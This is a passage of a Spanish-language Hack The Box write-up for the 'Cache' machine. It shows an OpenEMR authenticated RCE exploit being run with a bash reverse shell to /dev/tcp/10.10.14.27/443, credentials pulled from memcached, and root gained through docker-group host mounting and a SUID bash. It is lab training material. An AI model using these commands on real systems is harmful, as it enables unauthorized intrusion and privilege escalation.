+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+OpenEMR 5.0.1 - <span class="s1">'controller'</span> Remote Code Execution                                             | php/webapps/48623.txt
+OpenEMR 5.0.1 - Remote Code Execution <span class="o">(</span>1<span class="o">)</span>                                                      | php/webapps/48515.py
+OpenEMR 5.0.1 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                      | php/webapps/49486.rb
+OpenEMR 5.0.1.3 - <span class="s1">'manage_site_files'</span> Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                    | php/webapps/49998.py
+OpenEMR 5.0.1.3 - <span class="s1">'manage_site_files'</span> Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                | php/webapps/50122.rb
+OpenEMR 5.0.1.3 - <span class="o">(</span>Authenticated<span class="o">)</span> Arbitrary File Actions                                       | linux/webapps/45202.txt
+OpenEMR 5.0.1.3 - Authentication Bypass                                                        | php/webapps/50017.py
+OpenEMR 5.0.1.3 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                                        | php/webapps/45161.py
+OpenEMR 5.0.1.7 - <span class="s1">'fileName'</span> Path Traversal <span class="o">(</span>Authenticated<span class="o">)</span>                                    | php/webapps/50037.py
+OpenEMR 5.0.1.7 - <span class="s1">'fileName'</span> Path Traversal <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                | php/webapps/50087.rb
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+
+</code></pre></div></div>
+
+<p>Vemos varios que nos pueden ayudar y que requerimos de credenciales, las cuales ya las tenemos, así que vamos a descargarnos uno.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit <span class="nt">-m</span> php/webapps/45161.py
+  Exploit: OpenEMR 5.0.1.3 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>
+      URL: https://www.exploit-db.com/exploits/45161
+     Path: /usr/share/exploitdb/exploits/php/webapps/45161.py
+File Type: ASCII text
+
+Copied to: /home/k4miyo/Documentos/HTB/Cache/exploits/45161.py
+❯ <span class="nb">mv </span>45161.py openemr_rce.py
+</code></pre></div></div>
+
+<p>Si lo ejecutamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 openemr_rce.py
+usage: openemr_rce.py <span class="o">[</span><span class="nt">-h</span><span class="o">]</span> <span class="o">[</span><span class="nt">-u</span> USER] <span class="o">[</span><span class="nt">-p</span> PASSWORD] <span class="o">[</span><span class="nt">-c</span> CMD] host
+openemr_rce.py: error: the following arguments are required: host
+</code></pre></div></div>
+
+<p>Vemos que nos pide algunos parámetros e incluso, si le echamos un ojo al exploit, nos da un ejemplo de uso para obtener una reverse shell, así que vamos a seguirlo y de paso, nos ponemos en escucha por el puerto 443.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 openemr_rce.py http://hms.htb/ <span class="nt">-u</span> openemr_admin <span class="nt">-p</span> xxxxxx <span class="nt">-c</span> <span class="s1">'nohup bash -i &gt;&amp; /dev/tcp/10.10.14.27/443 0&gt;&amp;1 &amp;'</span>
+ .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
+/ .-. <span class="o">)</span> | .-.<span class="se">\ </span>| .-<span class="s1">'  |  \| || .-'</span>  |<span class="se">\ </span>   /|| .-.<span class="se">\ </span>  
+| | |<span class="o">(</span>_<span class="o">)</span>| |-<span class="s1">' )| `-.  |   | || `-.  |(\  / || `-'</span>/   
+| | | | | |--<span class="s1">' | .-'</span>  | |<span class="se">\ </span> <span class="o">||</span> .-<span class="s1">'  (_)\/  ||   (    
+\ `-'</span> / | |    |  <span class="sb">`</span><span class="nt">--</span>.| | |<span class="o">)||</span>  <span class="sb">`</span><span class="nt">--</span>.| <span class="se">\ </span> / <span class="o">||</span> |<span class="se">\ \ </span>  
+ <span class="o">)</span><span class="nt">---</span><span class="s1">'  /(     /( __.'</span>/<span class="o">(</span>  <span class="o">(</span>_<span class="o">)</span>/<span class="o">(</span> __.<span class="s1">'| |\/| ||_| \)\  
+(_)    (__)   (__)   (__)   (__)    '</span>-<span class="s1">'  '</span>-<span class="s1">'    (__) 
+                                                       
+   ={   P R O J E C T    I N S E C U R I T Y   }=    
+                                                       
+         Twitter : @Insecurity                       
+         Site    : insecurity.sh                     
+
+[$] Authenticating with openemr_admin:xxxxxx
+[$] Injecting payload
+[$] Payload executed
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.188] 54140
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1587<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>www-data
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina y para trabajar mejor, vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a>. Si vemos los usuarios del sistema, vemos que efectivamente se encontraba <strong>ash</strong>, por lo que podriamos tratar de migrar a dicho usuario con las credenciales que tenemos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s2">"sh$"</span>
+root:x:0:0:root:/root:/bin/bash
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="err">$</span>
+www-data@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span>su ash
+Password: 
+ash@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span><span class="nb">whoami
+</span>ash
+ash@cache:/var/www/hms.htb/public_html/interface/main<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>ash</strong> y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>ash<span class="o">)</span>
+ash@cache:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>ash: 
+ash@cache:/<span class="err">$</span>
+ash@cache:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null                                                                                       
+./bin/su                                                                                                                         
+./bin/fusermount                                                                                                                 
+./bin/mount                                                                                                                      
+./bin/ping
+./bin/umount
+./snap/core/9436/bin/mount
+./snap/core/9436/bin/ping
+./snap/core/9436/bin/ping6
+./snap/core/9436/bin/su
+./snap/core/9436/bin/umount
+./snap/core/9436/usr/bin/chfn
+./snap/core/9436/usr/bin/chsh
+./snap/core/9436/usr/bin/gpasswd 
+./snap/core/9436/usr/bin/newgrp
+./snap/core/9436/usr/bin/passwd
+./snap/core/9436/usr/bin/sudo
+./snap/core/9436/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./snap/core/9436/usr/lib/openssh/ssh-keysign
+./snap/core/9436/usr/lib/snapd/snap-confine
+./snap/core/9436/usr/sbin/pppd
+./snap/core/9993/bin/mount
+./snap/core/9993/bin/ping
+./snap/core/9993/bin/ping6
+./snap/core/9993/bin/su
+./snap/core/9993/bin/umount
+./snap/core/9993/usr/bin/chfn
+./snap/core/9993/usr/bin/chsh
+./snap/core/9993/usr/bin/gpasswd 
+./snap/core/9993/usr/bin/newgrp
+./snap/core/9993/usr/bin/passwd
+./snap/core/9993/usr/bin/sudo
+./snap/core/9993/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./snap/core/9993/usr/lib/openssh/ssh-keysign
+./snap/core/9993/usr/lib/snapd/snap-confine
+./snap/core/9993/usr/sbin/pppd
+./usr/bin/newgidmap
+./usr/bin/newuidmap
+./usr/bin/passwd
+./usr/bin/traceroute6.iputils
+./usr/bin/newgrp
+./usr/bin/gpasswd
+./usr/bin/chfn
+./usr/bin/pkexec
+./usr/bin/chsh
+./usr/bin/at
+./usr/bin/sudo
+./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+./usr/lib/snapd/snap-confine
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/openssh/ssh-keysign
+ash@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Dentro de los permisos SUID vemos el pkexec; sin embargo, vamos a tratar de resolver la máquina como esta pensada; por lo tanto, vamos a ver los procesos que están corriendo en el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>ps <span class="nt">-faux</span>                                                                                                            
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND                       
+root         2  0.0  0.0      0     0 ?        S    Mar12   0:00 <span class="o">[</span>kthreadd]                                                      
+root         4  0.0  0.0      0     0 ?        I&lt;   Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>kworker/0:0H]
+root         6  0.0  0.0      0     0 ?        I&lt;   Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>mm_percpu_wq]       
+root         7  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>ksoftirqd/0]                       
+root         8  0.0  0.0      0     0 ?        I    Mar12   0:03  <span class="se">\_</span> <span class="o">[</span>rcu_sched]       
+root         9  0.0  0.0      0     0 ?        I    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>rcu_bh]                                                    
+root        10  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>migration/0]                                               
+root        11  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>watchdog/0]                 
+root        12  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>cpuhp/0]    
+root        13  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>cpuhp/1]       
+root        14  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>watchdog/1]   
+root        15  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>migration/1]                                               
+root        16  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>ksoftirqd/1]                      
+root        18  0.0  0.0      0     0 ?        I&lt;   Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>kworker/1:0H]
+root        19  0.0  0.0      0     0 ?        S    Mar12   0:00  <span class="se">\_</span> <span class="o">[</span>kdevtmpfs]
+<span class="nt">---</span>
+root       970  0.0  0.2  88228  9560 ?        Ss   Mar12   0:00 /usr/bin/VGAuthService
+root      1007  0.0  0.4 169100 17192 ?        Ssl  Mar12   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher <span class="nt">--run-startup-trig</span>
+memcache  1008  0.0  0.0 425792  3944 ?        Ssl  Mar12   0:04 /usr/bin/memcached <span class="nt">-m</span> 64 <span class="nt">-p</span> 11211 <span class="nt">-u</span> memcache <span class="nt">-l</span> 127.0.0.1 <span class="nt">-P</span> /v
+root      1024  0.0  0.0 110548  2040 ?        Ssl  Mar12   0:00 /usr/sbin/irqbalance <span class="nt">--foreground</span>
+root      1025  0.0  0.0  30028  3252 ?        Ss   Mar12   0:00 /usr/sbin/cron <span class="nt">-f</span>
+root      1028  0.0  0.7 859748 29648 ?        Ssl  Mar12   0:02 /usr/lib/snapd/snapd
+root      1029  0.0  0.9 883080 39136 ?        Ssl  Mar12   0:02 /usr/bin/containerd
+root      1032  0.0  0.4 185944 20180 ?        Ssl  Mar12   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgra
+root      1098  0.0  0.1 288884  6536 ?        Ssl  Mar12   0:00 /usr/lib/policykit-1/polkitd <span class="nt">--no-debug</span>
+root      1178  0.0  0.1  72300  5676 ?        Ss   Mar12   0:00 /usr/sbin/sshd <span class="nt">-D</span>
+root      1179  0.0  0.0  14888  1964 tty1     Ss+  Mar12   0:00 /sbin/agetty <span class="nt">-o</span> <span class="nt">-p</span> <span class="nt">--</span> <span class="se">\u</span> <span class="nt">--noclear</span> tty1 linux
+mysql     1228  0.1  6.5 1628852 265532 ?      Sl   Mar12   0:19 /usr/sbin/mysqld <span class="nt">--daemonize</span> <span class="nt">--pid-file</span><span class="o">=</span>/run/mysqld/mysqld.pid
+root      1587  0.0  0.4 364496 19788 ?        Ss   Mar12   0:00 /usr/sbin/apache2 <span class="nt">-k</span> start
+<span class="nt">---</span>
+</code></pre></div></div>
+
+<p>Uno que ya nos llama la atención es <strong>memcache</strong>, así que vamos a buscar un poco de que se trata y que podemos hacer. Encontramos el recurso <a href="https://lzone.de/cheat-sheet/memcached">lzone.de</a> en donde nos indica que informarción podemos obtener. Asi que primero vamos a conectarnos vía telnet.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>telnet 127.0.0.1 11211
+Trying 127.0.0.1...     
+Connected to 127.0.0.1.     
+Escape character is <span class="s1">'^]'</span><span class="nb">.</span>                                       
+stats                                                           
+STAT pid 1008                                                   
+STAT <span class="nb">uptime </span>14578              
+STAT <span class="nb">time </span>1647140837                                            
+STAT version 1.5.6 Ubuntu   
+STAT libevent 2.1.8-stable
+STAT pointer_size 64      
+STAT rusage_user 1.812221   
+STAT rusage_system 2.446285                                     
+STAT max_connections 1024
+STAT curr_connections 1  
+STAT total_connections 246
+STAT rejected_connections 0
+STAT connection_structures 2
+STAT reserved_fds 20
+<span class="nt">---</span>
+STAT moves_to_warm 0
+STAT moves_within_lru 0
+STAT direct_reclaims 0
+STAT lru_bumps_dropped 0
+END
+</code></pre></div></div>
+
+<p>Leyendo un poco, vemos que podemos obtener unas <strong>keys</strong> con el comando <code class="language-plaintext highlighter-rouge">stats items</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats items
+STAT items:1:number 5
+STAT items:1:number_hot 0
+STAT items:1:number_warm 0
+STAT items:1:number_cold 5
+STAT items:1:age_hot 0
+STAT items:1:age_warm 0
+STAT items:1:age 57
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:evicted_active 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 84
+STAT items:1:lrutail_reflocked 0
+STAT items:1:moves_to_cold 1225
+STAT items:1:moves_to_warm 0
+STAT items:1:moves_within_lru 0
+STAT items:1:direct_reclaims 0
+STAT items:1:hits_to_hot 0
+STAT items:1:hits_to_warm 0
+STAT items:1:hits_to_cold 0
+STAT items:1:hits_to_temp 0
+END
+</code></pre></div></div>
+
+<p>En este caso, vemos que solo tenemos el item número 1 (definida mejor como clase). Y para dumpear las <strong>keys</strong>, aplicamos el comando <code class="language-plaintext highlighter-rouge">stats cachedump &lt;slab class&gt; &lt;number of items to dump&gt;</code>, que sería <code class="language-plaintext highlighter-rouge">stats cachedump 1 0</code> (el 0 es para ir probando).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stats cachedump 1 0
+ITEM <span class="nb">link</span> <span class="o">[</span>21 b<span class="p">;</span> 0 s]
+ITEM user <span class="o">[</span>5 b<span class="p">;</span> 0 s]
+ITEM passwd <span class="o">[</span>9 b<span class="p">;</span> 0 s]
+ITEM file <span class="o">[</span>7 b<span class="p">;</span> 0 s]
+ITEM account <span class="o">[</span>9 b<span class="p">;</span> 0 s]
+END
+</code></pre></div></div>
+
+<p>Vemos un campo <strong>user</strong> y uno de <strong>passwd</strong>. Para obtener su valor, ocupamos el comando <code class="language-plaintext highlighter-rouge">get</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get user
+VALUE user 0 5
+luffy
+END
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+</code></pre></div></div>
+
+<p>Tenemos la credencial <strong>luffy : 0n3_p1ec3</strong>; por lo que podríamos tratar de migrar a dicho usuario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ash@cache:/<span class="nv">$ </span>su luffy
+Password: 
+luffy@cache:/<span class="nv">$ </span><span class="nb">whoami
+</span>luffy
+luffy@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Nos convertimos en el usuario <strong>luffy</strong> y vemos que se encuentra en el grupo <strong>docker</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
+luffy@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Por lo tanto, ya tenemos una posible vía para convertirnos en <strong>root</strong> creando un contenedor (en este caso ya lo tenemos) y crear una montura dentro del contener de la raiz del sistema principal; con esto, podemos ingresar al contenedor como <strong>root</strong> y modificar cualquier archivo, incluyendo la montura.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        2 years ago         64.2MB
+luffy@cache:/<span class="nv">$ </span>docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/<span class="nv">$ </span>docker ps <span class="nt">-a</span>
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Aprovechamos la imagen que ya esta <strong>ubuntu</strong> y creamos el contenedor.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker run <span class="nt">--rm</span> <span class="nt">-dit</span> <span class="nt">--name</span> privesc ubuntu
+9c85c1a826d694eebb3ba9f0cc84c1b52f6db278ef6f02009f390d7737862726
+luffy@cache:/<span class="nv">$ </span>docker ps
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+9c85c1a826d6        ubuntu              <span class="s2">"/bin/bash"</span>         4 seconds ago       Up 1 second                             privesc
+luffy@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>De forma interactiva nos desplegamos una <code class="language-plaintext highlighter-rouge">/bin/bash</code> para nuestro contenedor <strong>privesc</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker <span class="nb">exec</span> <span class="nt">-it</span> privesc /bin/bash
+root@9c85c1a826d6:/#
+</code></pre></div></div>
+
+<p>Creamos la montura de la raiz del sistema principal; por lo que antes paramos el contenedor y creamos uno nuevo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker ps <span class="nt">-a</span>
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+9c85c1a826d6        ubuntu              <span class="s2">"/bin/bash"</span>         4 minutes ago       Up 4 minutes                            privesc
+luffy@cache:/<span class="err">$</span>
+luffy@cache:/<span class="nv">$ </span>docker stop privesc
+privesc
+luffy@cache:/<span class="nv">$ </span>docker ps <span class="nt">-a</span>
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker run <span class="nt">--rm</span> <span class="nt">-v</span> /:/mnt/root <span class="nt">-dit</span> <span class="nt">--name</span> privesc ubuntu
+6ab913d0e201d03cb938fb723f06414f1463196ac686112681978899fdccf2cf
+luffy@cache:/<span class="nv">$ </span>docker <span class="nb">exec</span> <span class="nt">-it</span> privesc /bin/bash
+root@6ab913d0e201:/#
+</code></pre></div></div>
+
+<p>Ahora si checamos el recurso <code class="language-plaintext highlighter-rouge">/mnt/root/</code> dentro del contenedor, tenemos montado la raiz del sistema principal.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@6ab913d0e201:/# <span class="nb">ls</span> <span class="nt">-l</span> /mnt/root/
+total 1645660
+drwxr-xr-x   2 root root       4096 Jul  9  2020 bin
+drwxr-xr-x   3 root root       4096 Sep 16  2020 boot
+drwxr-xr-x  18 root root       3900 Mar 12 23:04 dev
+drwxr-xr-x  99 root root       4096 Jul  9  2020 etc
+drwxr-xr-x   4 root root       4096 Sep 17  2019 home
+lrwxrwxrwx   1 root root         34 Jul  9  2020 initrd.img -&gt; boot/initrd.img-4.15.0-109-generic
+lrwxrwxrwx   1 root root         33 Jul  9  2020 initrd.img.old -&gt; boot/initrd.img-4.15.0-99-generic
+drwxr-xr-x  22 root root       4096 Sep 18  2019 lib
+drwxr-xr-x   2 root root       4096 Jul  9  2020 lib64
+drwx------   2 root root      16384 Sep 17  2019 lost+found
+drwxr-xr-x   2 root root       4096 Feb 14  2019 media
+drwxr-xr-x   2 root root       4096 Feb 14  2019 mnt
+drwxr-xr-x   3 root root       4096 Sep 18  2019 opt
+dr-xr-xr-x 193 root root          0 Mar 12 23:04 proc
+drwx------   6 root root       4096 Sep 16  2020 root
+drwxr-xr-x  31 root root       1020 Mar 12 23:05 run
+drwxr-xr-x   2 root root      12288 Jul  9  2020 sbin
+drwxr-xr-x   4 root root       4096 Sep 17  2019 snap
+drwxr-xr-x   2 root root       4096 Feb 14  2019 srv
+<span class="nt">-rw-------</span>   1 root root 1685061632 Sep 17  2019 swap.img
+dr-xr-xr-x  13 root root          0 Mar 12 23:04 sys
+drwxrwxrwt  12 root root       4096 Mar 13 03:29 tmp
+drwxr-xr-x  10 root root       4096 Feb 14  2019 usr
+drwxr-xr-x  14 root root       4096 Sep 17  2019 var
+lrwxrwxrwx   1 root root         31 Jul  9  2020 vmlinuz -&gt; boot/vmlinuz-4.15.0-109-generic
+lrwxrwxrwx   1 root root         30 Jul  9  2020 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-99-generic
+root@6ab913d0e201:/#
+</code></pre></div></div>
+
+<p>Aprovechando los privilegios que tenemos sobre el contenedor, podemos darle permisos SUID a <code class="language-plaintext highlighter-rouge">/bin/bash</code> que se encuentra bajo la ruta <code class="language-plaintext highlighter-rouge">/mnt/root</code>, es decir <code class="language-plaintext highlighter-rouge">chmod 4755 /mnt/root/bin/bash</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@6ab913d0e201:/# <span class="nb">chmod </span>4755 /mnt/root/bin/bash 
+root@6ab913d0e201:/# <span class="nb">ls</span> <span class="nt">-l</span> /mnt/root/bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1113504 Apr  4  2018 /mnt/root/bin/bash
+root@6ab913d0e201:/# 
+</code></pre></div></div>
+
+<p>Nos salimos del contenedor y lo paramos. Si vemos los permisos en la máquina principal de <code class="language-plaintext highlighter-rouge">/bin/bash</code>, vemos que es SUID.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>docker stop privesc
+privesc
+luffy@cache:/<span class="nv">$ </span>docker ps <span class="nt">-a</span>
+CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
+luffy@cache:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1113504 Apr  4  2018 /bin/bash
+luffy@cache:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya aquí podemos migrar a <strong>root</strong> facilmente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-4.4# <span class="nb">whoami
+</span>root
+bash-4.4#
+</code></pre></div></div>
+
+<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#sandbox-escape" class="page__taxonomy-item" rel="tag">Sandbox_Escape</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-03-12T00:00:00-06:00">March 12, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-bank/" class="pagination--pager" title="Hack The Box Bank
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
